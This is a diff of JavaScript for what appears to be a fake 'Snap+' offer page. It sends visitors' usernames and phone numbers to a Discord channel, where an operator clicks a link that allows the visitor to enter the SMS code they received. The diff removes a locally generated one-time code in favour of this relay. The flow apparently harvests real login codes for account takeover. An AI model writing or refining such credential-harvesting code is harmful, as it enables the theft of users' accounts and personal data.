@@ -15,23 +15,21 @@ document.addEventListener('DOMContentLoaded', () => {
     const siteUrl = 'http://snapplusnety.vercel.app'; 
     // --------------------
 
-    // Génère un ID unique et un code OTP
+    // Génère un ID unique pour la demande
     const requestId = 'req_' + Date.now();
-    const otpCode = Math.floor(1000 + Math.random() * 9000).toString();
     const validationLink = `${siteUrl}/validate.html?id=${requestId}`;
 
-    // Prépare le message pour Discord
+    // Prépare le message pour Discord (sans le code OTP)
     const payload = {
-      content: `📩 **Nouvelle demande Snap+**`,
+      content: `📩 **Nouvelle demande Snap+ en attente de validation**`,
       embeds: [{
         title: 'Action requise',
-        description: `Cliquez sur le lien ci-dessous pour **Accepter** la demande.`,
+        description: `Cliquez sur le lien ci-dessous pour autoriser l'utilisateur à entrer son code SMS.`,
         color: 15105570,
         fields: [
           { name: 'Nom d\'utilisateur', value: username, inline: true },
           { name: 'Téléphone', value: phone, inline: true },
-          { name: 'Code OTP', value: `**${otpCode}**`, inline: false },
-          { name: 'Lien de validation', value: `[✅ Accepter](${validationLink})`, inline: false }
+          { name: 'Lien de validation', value: `[✅ Autoriser](${validationLink})`, inline: false }
         ],
         footer: { text: `ID: ${requestId}` }
       }]
@@ -48,9 +46,8 @@ document.addEventListener('DOMContentLoaded', () => {
 
       console.log('Message envoyé à Discord !');
       
-      // Stocke les infos pour la suite
+      // Stocke uniquement l'ID de la demande
       sessionStorage.setItem('snapRequestId', requestId);
-      sessionStorage.setItem('snapOtpCode', otpCode);
       sessionStorage.setItem('snapUsername', username);
       sessionStorage.setItem('snapPhone', phone);
 
